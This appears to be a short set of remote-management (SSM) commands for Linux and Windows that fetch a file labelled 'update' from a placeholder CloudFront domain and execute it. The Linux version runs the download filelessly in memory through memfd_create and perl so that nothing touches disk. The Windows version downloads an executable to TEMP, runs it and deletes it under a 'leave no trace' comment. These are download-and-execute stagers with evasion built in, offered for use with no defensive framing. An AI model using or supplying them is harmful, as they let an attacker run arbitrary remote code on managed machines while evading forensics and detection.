# Linux SSM command
# Download and execute without touching the disk
## edit url
curl -fsSL https://your-distro.cloudfront.net/updates/update | perl -e '
    $name = "in_memory_update";
    $fd = syscall(319, $name, 1); # 319 is memfd_create
    open($fh, ">&=$fd");
    print $fh <STDIN>;
    exec {"/proc/self/fd/$fd"} $name;
'

# Windows SSM command
## edit url
$url = "https://your-distro.cloudfront.net/updates/update.exe"
$path = "$env:TEMP\update.exe"

# 1. Download
Invoke-WebRequest -Uri $url -OutFile $path

# 2. Execute
Start-Process -FilePath $path -Wait

# 3. Clean up (GTIG compliance: leave no trace)
Remove-Item -Path $path
